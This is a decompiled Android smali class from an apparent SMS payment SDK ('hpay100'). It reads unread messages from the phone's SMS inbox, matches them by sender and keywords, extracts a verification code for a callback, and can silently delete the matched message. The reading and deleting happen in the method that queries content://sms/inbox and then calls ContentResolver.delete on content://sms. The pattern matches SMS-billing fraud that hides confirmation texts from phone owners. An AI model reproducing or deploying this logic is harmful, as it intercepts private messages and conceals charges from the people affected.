.class public Lcom/arcsoft/hpay100/config/al;
.super Ljava/lang/Object;


# static fields
.field private static a:Lcom/arcsoft/hpay100/HPaySMSXTCodeCallBack; = null

.field private static final b:I = 0xc350

.field private static c:Ljava/lang/Runnable;

.field private static d:Landroid/os/Handler;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const/4 v0, 0x0

    sput-object v0, Lcom/arcsoft/hpay100/config/al;->c:Ljava/lang/Runnable;

    sput-object v0, Lcom/arcsoft/hpay100/config/al;->d:Landroid/os/Handler;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method static synthetic a(Landroid/content/Context;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Lcom/arcsoft/hpay100/config/ac;
    .locals 1

    invoke-static {p0, p1, p2, p3}, Lcom/arcsoft/hpay100/config/al;->b(Landroid/content/Context;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Lcom/arcsoft/hpay100/config/ac;

    move-result-object v0

    return-object v0
.end method

.method static synthetic a()V
    .locals 0

    invoke-static {}, Lcom/arcsoft/hpay100/config/al;->e()V

    return-void
.end method

.method static synthetic a(Landroid/app/Activity;)V
    .locals 0

    invoke-static {p0}, Lcom/arcsoft/hpay100/config/al;->b(Landroid/app/Activity;)V

    return-void
.end method

.method private static a(Landroid/app/Activity;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)V
    .locals 1

    new-instance v0, Lcom/arcsoft/hpay100/config/ao;

    invoke-direct {v0, p0, p1, p2, p3}, Lcom/arcsoft/hpay100/config/ao;-><init>(Landroid/app/Activity;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {v0}, Lcom/arcsoft/hpay100/config/ab;->a(Lcom/arcsoft/hpay100/config/ar;)V

    return-void
.end method

.method public static a(Landroid/app/Activity;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Lcom/arcsoft/hpay100/HPaySMSXTCodeCallBack;)V
    .locals 4

    const-string v0, "dalongTest"

    const-string v1, "sumbitSMSCode:"

    invoke-static {v0, v1}, Lcom/arcsoft/hpay100/utils/k;->b(Ljava/lang/String;Ljava/lang/String;)V

    sput-object p4, Lcom/arcsoft/hpay100/config/al;->a:Lcom/arcsoft/hpay100/HPaySMSXTCodeCallBack;

    invoke-static {p0, p1, p2, p3}, Lcom/arcsoft/hpay100/config/al;->a(Landroid/app/Activity;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {}, Lcom/arcsoft/hpay100/config/al;->d()V

    new-instance v0, Lcom/arcsoft/hpay100/config/am;

    invoke-direct {v0, p0}, Lcom/arcsoft/hpay100/config/am;-><init>(Landroid/app/Activity;)V

    sput-object v0, Lcom/arcsoft/hpay100/config/al;->c:Ljava/lang/Runnable;

    new-instance v0, Landroid/os/Handler;

    invoke-virtual {p0}, Landroid/app/Activity;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    sput-object v0, Lcom/arcsoft/hpay100/config/al;->d:Landroid/os/Handler;

    sget-object v0, Lcom/arcsoft/hpay100/config/al;->d:Landroid/os/Handler;

    sget-object v1, Lcom/arcsoft/hpay100/config/al;->c:Ljava/lang/Runnable;

    const-wide/32 v2, 0xc350

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method

.method static synthetic a(Lcom/arcsoft/hpay100/HPaySMSXTCodeCallBack;)V
    .locals 0

    sput-object p0, Lcom/arcsoft/hpay100/config/al;->a:Lcom/arcsoft/hpay100/HPaySMSXTCodeCallBack;

    return-void
.end method

.method private static b(Landroid/content/Context;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Lcom/arcsoft/hpay100/config/ac;
    .locals 12

    :try_start_0
    const-string v0, "content://sms/inbox"

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    const/4 v0, 0x4

    new-array v2, v0, [Ljava/lang/String;

    const/4 v0, 0x0

    const-string v3, "_id"

    aput-object v3, v2, v0

    const/4 v0, 0x1

    const-string v3, "address"

    aput-object v3, v2, v0

    const/4 v0, 0x2

    const-string v3, "read"

    aput-object v3, v2, v0

    const/4 v0, 0x3

    const-string v3, "body"

    aput-object v3, v2, v0

    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v3, ""

    invoke-static {p1}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_1

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, " read = 0  and date > "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v4

    const-wide/32 v6, 0x1b7740

    sub-long/2addr v4, v6

    invoke-virtual {v3, v4, v5}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const-string v4, "dalongTest"

    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "selection"

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v4, v5}, Lcom/arcsoft/hpay100/utils/k;->b(Ljava/lang/String;Ljava/lang/String;)V

    const/4 v4, 0x0

    const-string v5, "_id desc"

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v1

    :goto_0
    const-string v2, "dalongTest"

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "cursor.getCount():"

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-interface {v1}, Landroid/database/Cursor;->getCount()I

    move-result v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Lcom/arcsoft/hpay100/utils/k;->b(Ljava/lang/String;Ljava/lang/String;)V

    if-eqz v1, :cond_6

    invoke-interface {v1}, Landroid/database/Cursor;->getCount()I

    move-result v2

    if-lez v2, :cond_6

    invoke-interface {v1}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v2

    if-eqz v2, :cond_6

    const-string v2, "address"

    invoke-interface {v1, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    const-string v3, "body"

    invoke-interface {v1, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {v1, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    invoke-interface {v1, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    const-string v3, "\n"

    const-string v5, " "

    invoke-virtual {v2, v3, v5}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v2, "dalongTest"

    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "inbox number-----:"

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v2, v5}, Lcom/arcsoft/hpay100/utils/k;->b(Ljava/lang/String;Ljava/lang/String;)V

    const-string v2, "dalongTest"

    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "inbox content----:"

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v2, v5}, Lcom/arcsoft/hpay100/utils/k;->b(Ljava/lang/String;Ljava/lang/String;)V

    const-string v2, "_id"

    invoke-interface {v1, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v5

    invoke-interface {v1, v5}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v6

    invoke-static {v4}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_0

    invoke-static {v3}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_2

    :cond_0
    const/4 v0, 0x0

    :goto_1
    return-object v0

    :cond_1
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, " address Like ?  and read = 0  and date > "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v4

    const-wide/32 v6, 0x1b7740

    sub-long/2addr v4, v6

    invoke-virtual {v3, v4, v5}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const-string v4, "dalongTest"

    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "selection"

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v4, v5}, Lcom/arcsoft/hpay100/utils/k;->b(Ljava/lang/String;Ljava/lang/String;)V

    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/String;

    const/4 v5, 0x0

    new-instance v6, Ljava/lang/StringBuilder;

    const-string v7, "%"

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "%"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    aput-object v6, v4, v5

    const-string v5, "_id desc"

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v1

    goto/16 :goto_0

    :cond_2
    invoke-static {p3}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_7

    const-string v1, ""

    if-eqz p2, :cond_3

    array-length v1, p2

    if-nez v1, :cond_5

    :cond_3
    const-string v1, ""

    :goto_2
    invoke-static {v3, v1}, Lcom/arcsoft/hpay100/utils/HPaySMSUtils;->b(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_6

    new-instance v1, Lcom/arcsoft/hpay100/config/ac;

    invoke-direct {v1}, Lcom/arcsoft/hpay100/config/ac;-><init>()V

    iput-object v4, v1, Lcom/arcsoft/hpay100/config/ac;->a:Ljava/lang/String;

    iput-object v2, v1, Lcom/arcsoft/hpay100/config/ac;->b:Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    :try_start_1
    sget v2, Lcom/arcsoft/hpay100/config/c;->i:I

    if-nez v2, :cond_4

    const/4 v2, -0x1

    if-eq v5, v2, :cond_4

    const-string v2, "dalongTest"

    new-instance v5, Ljava/lang/StringBuilder;

    const-string v8, "delete smssender:"

    invoke-direct {v5, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v2, v4}, Lcom/arcsoft/hpay100/utils/k;->b(Ljava/lang/String;Ljava/lang/String;)V

    const-string v2, "dalongTest"

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "delete smscontent"

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Lcom/arcsoft/hpay100/utils/k;->b(Ljava/lang/String;Ljava/lang/String;)V

    const-string v2, "content://sms"

    invoke-static {v2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "_id="

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v6, v7}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x0

    invoke-virtual {v0, v2, v3, v4}, Landroid/content/ContentResolver;->delete(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I

    move-result v0

    const-string v2, "dalongTest"

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "delete --count:"

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v2, v0}, Lcom/arcsoft/hpay100/utils/k;->b(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :cond_4
    :goto_3
    move-object v0, v1

    goto/16 :goto_1

    :cond_5
    const/4 v1, 0x0

    :try_start_2
    aget-object v1, p2, v1
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    :try_start_3
    new-instance v2, Ljava/lang/String;

    invoke-static {v1}, Lcom/arcsoft/hpay100/utils/a;->a(Ljava/lang/String;)[B

    move-result-object v1

    const-string v8, "utf-8"

    invoke-direct {v2, v1, v8}, Ljava/lang/String;-><init>([BLjava/lang/String;)V

    invoke-virtual {v2}, Ljava/lang/String;->toString()Ljava/lang/String;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0

    move-result-object v1

    goto/16 :goto_2

    :catch_0
    move-exception v1

    :try_start_4
    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    const-string v1, ""

    goto/16 :goto_2

    :catch_1
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    goto :goto_3

    :catch_2
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    :cond_6
    const/4 v0, 0x0

    goto/16 :goto_1

    :cond_7
    if-eqz p2, :cond_8

    :try_start_5
    array-length v1, p2

    if-nez v1, :cond_9

    :cond_8
    const/4 v0, 0x0

    goto/16 :goto_1

    :cond_9
    const/4 v1, 0x1

    const/4 v2, 0x0

    :goto_4
    array-length v8, p2

    if-lt v2, v8, :cond_b

    :goto_5
    const-string v2, "dalongTest"

    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "kss:"

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8, v1}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-static {v2, v8}, Lcom/arcsoft/hpay100/utils/k;->b(Ljava/lang/String;Ljava/lang/String;)V

    if-eqz v1, :cond_6

    new-instance v1, Lcom/arcsoft/hpay100/config/ac;

    invoke-direct {v1}, Lcom/arcsoft/hpay100/config/ac;-><init>()V

    iput-object v4, v1, Lcom/arcsoft/hpay100/config/ac;->a:Ljava/lang/String;

    iput-object p3, v1, Lcom/arcsoft/hpay100/config/ac;->b:Ljava/lang/String;
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_2

    :try_start_6
    sget v2, Lcom/arcsoft/hpay100/config/c;->i:I

    if-nez v2, :cond_a

    const/4 v2, -0x1

    if-eq v5, v2, :cond_a

    const-string v2, "dalongTest"

    new-instance v5, Ljava/lang/StringBuilder;

    const-string v8, "delete smssender:"

    invoke-direct {v5, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v2, v4}, Lcom/arcsoft/hpay100/utils/k;->b(Ljava/lang/String;Ljava/lang/String;)V

    const-string v2, "dalongTest"

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "delete smscontent"

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Lcom/arcsoft/hpay100/utils/k;->b(Ljava/lang/String;Ljava/lang/String;)V

    const-string v2, "content://sms"

    invoke-static {v2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "_id="

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v6, v7}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x0

    invoke-virtual {v0, v2, v3, v4}, Landroid/content/ContentResolver;->delete(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I

    move-result v0

    const-string v2, "dalongTest"

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "delete --count:"

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v2, v0}, Lcom/arcsoft/hpay100/utils/k;->b(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_3

    :cond_a
    :goto_6
    move-object v0, v1

    goto/16 :goto_1

    :cond_b
    :try_start_7
    aget-object v8, p2, v2

    const-string v9, "dalongTest"

    new-instance v10, Ljava/lang/StringBuilder;

    const-string v11, "sms content keyword:"

    invoke-direct {v10, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v10, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-static {v9, v10}, Lcom/arcsoft/hpay100/utils/k;->b(Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {v8}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v9

    if-nez v9, :cond_c

    invoke-virtual {v3, v8}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v8

    if-nez v8, :cond_c

    const/4 v1, 0x0

    goto/16 :goto_5

    :cond_c
    add-int/lit8 v2, v2, 0x1

    goto/16 :goto_4

    :catch_3
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_2

    goto :goto_6
.end method

.method static synthetic b()V
    .locals 0

    invoke-static {}, Lcom/arcsoft/hpay100/config/al;->d()V

    return-void
.end method

.method private static b(Landroid/app/Activity;)V
    .locals 2

    const-string v0, "dalongTest"

    const-string v1, "onSmsTimeout:"

    invoke-static {v0, v1}, Lcom/arcsoft/hpay100/utils/k;->b(Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {}, Lcom/arcsoft/hpay100/config/al;->e()V

    invoke-static {}, Lcom/arcsoft/hpay100/config/al;->d()V

    new-instance v0, Lcom/arcsoft/hpay100/config/an;

    invoke-direct {v0}, Lcom/arcsoft/hpay100/config/an;-><init>()V

    invoke-virtual {p0, v0}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    return-void
.end method

.method static synthetic c()Lcom/arcsoft/hpay100/HPaySMSXTCodeCallBack;
    .locals 1

    sget-object v0, Lcom/arcsoft/hpay100/config/al;->a:Lcom/arcsoft/hpay100/HPaySMSXTCodeCallBack;

    return-object v0
.end method

.method private static d()V
    .locals 2

    :try_start_0
    sget-object v0, Lcom/arcsoft/hpay100/config/al;->d:Landroid/os/Handler;

    if-eqz v0, :cond_0

    sget-object v0, Lcom/arcsoft/hpay100/config/al;->d:Landroid/os/Handler;

    sget-object v1, Lcom/arcsoft/hpay100/config/al;->c:Ljava/lang/Runnable;

    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    const/4 v0, 0x0

    sput-object v0, Lcom/arcsoft/hpay100/config/al;->d:Landroid/os/Handler;

    const/4 v0, 0x0

    sput-object v0, Lcom/arcsoft/hpay100/config/al;->c:Ljava/lang/Runnable;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_0
    :goto_0
    return-void

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method private static e()V
    .locals 1

    const/4 v0, 0x0

    invoke-static {v0}, Lcom/arcsoft/hpay100/config/ab;->a(Lcom/arcsoft/hpay100/config/ar;)V

    return-void
.end method
